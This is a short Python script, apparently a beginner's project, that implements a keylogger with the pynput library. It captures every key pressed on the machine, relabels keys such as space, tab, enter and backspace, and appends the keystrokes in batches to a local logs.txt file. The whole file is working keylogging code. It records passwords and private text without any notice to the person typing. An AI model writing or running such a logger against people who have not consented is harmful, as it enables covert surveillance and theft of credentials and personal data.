from time import time
from pynput.keyboard import Listener
from datetime import datetime

count = 0
keys = []


# Define a keystroke 
def keystroke(key):
    global keys, count
    key = str(key).replace("'", "")

    # Create rules for special characters (keys with Powers)
    # We could create a dictionary here
    #specialChar = {'Key.space':'[SPACE]', ...}
    if key == 'Key.space':
        key = '[SPACE]'
    
    if key == "Key.shift_r":
        key = "[SHIFT RIGHT]"
    
    if key == "Key.tab":
        key = "[TAB]"

    if key == "Key.enter":
        key = "[ENTER]"

    if key == "Key.backspace":
        key = "[BACKSPACE]"
    
    if key == "Key.caps_lock":
        key = "[CAPS LOCK]"

    print (key)
    keys.append(key)
    count += 1

    if count > 10:
        write_file(keys)
        count = 0
        keys = []

def write_file(logs):
    with open("logs.txt", "a") as file:
        for key in logs:
            file.write(str(key))

with Listener(on_press=keystroke) as listener:
    listener.join()